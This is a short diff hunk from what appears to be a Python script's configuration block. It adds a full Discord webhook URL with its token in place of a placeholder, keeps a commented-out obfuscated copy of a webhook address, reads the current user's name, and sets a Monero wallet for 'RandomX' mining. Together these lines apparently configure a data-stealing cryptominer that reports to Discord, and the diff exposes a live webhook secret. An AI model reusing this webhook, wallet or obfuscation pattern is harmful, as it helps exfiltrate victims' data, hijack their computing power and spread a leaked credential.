@@ -58,7 +58,7 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+chiffre = "https://discord.com/api/webhooks/1010712769177329866/2vMCNQ39UzNhkmcMHAbMBbEjCcThaiL0dy8trkfZmkqvWYaFn1rxsPi2_4SeVZ2_PfK0"
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
